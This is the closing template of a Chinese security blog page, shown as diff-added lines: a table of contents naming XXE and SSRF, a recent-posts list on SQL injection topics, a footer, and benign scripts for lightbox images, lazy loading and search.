+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>目录
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE"><span class="toc-text">XXE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-text">SSRF</span></a></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>最近文章
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-06</div>
+        <a href="/article/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><div class="recent-posts-item-content">信息收集</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Access%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Access注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/MSSQL%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">MSSQL注入</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2021-08-05</div>
+        <a href="/article/Mysql%E6%B3%A8%E5%85%A5/"><div class="recent-posts-item-content">Mysql注入</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020 -
+          
+          2021
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          沉墨的小小技术圈
+        </a>
+      </div>
+    </div>
+
+    
+    
+    
+      <div class="BbeiAn-info">
+        <a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/">皖ICP备2021010523号-1 </a>
+      </div>
+      
+        <div class="BbeiAn-info">
+          <span style="padding-left: 25px;background: url(/img/beian.png) no-repeat left center"></span>
+          <a target="_blank" rel="noopener" href="http://www.beian.gov.cn/portal/recordQuery ">皖公网安备 34012202341035号
+          </a>
+          <br />
+        </div>
+      
+    
+    
+      <div class="footer-dsc">
+        
+          本站总访问量<span id="busuanzi_value_site_pv"></span>次
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          本站总访客数<span id="busuanzi_value_site_uv"></span>次
+        
+      </div>
+      
+    
+</footer> 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
+
+<a 
+  role="button" 
+  id="menubutton" 
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+    
+      <script> 
+        loadScript('/js/lib/busuanzi.min.js') 
+      </script>
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+     
+    
+    
+      <script>
+        setTimeout(() => {localSearch("search.json")}, 0)
+      </script>
+    
+  </body>
+</html>
